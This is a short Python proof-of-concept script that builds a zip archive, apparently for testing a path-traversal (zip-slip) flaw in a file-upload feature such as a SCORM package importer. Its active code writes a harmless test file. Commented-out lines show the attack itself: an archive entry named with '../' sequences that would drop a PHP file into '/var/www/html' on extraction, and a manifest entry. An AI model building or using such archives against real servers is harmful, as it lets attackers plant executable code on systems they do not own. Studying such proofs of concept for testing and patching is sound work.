#!/usr/bin/python
import zipfile
from io import BytesIO

def _build_zip():
	f = BytesIO()
	z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
	z.writestr('poc/poc.txt', 'test')
	#z.writestr('../../../../../var/www/html/poc.phtml', '<?php phpinfo(); ?>')
	#z.writestr('imsmanifest.xml','<tag></tag>')
	z.close()
	zip = open('poc.zip','wb')
	zip.write(f.getvalue())
	zip.close()

_build_zip()
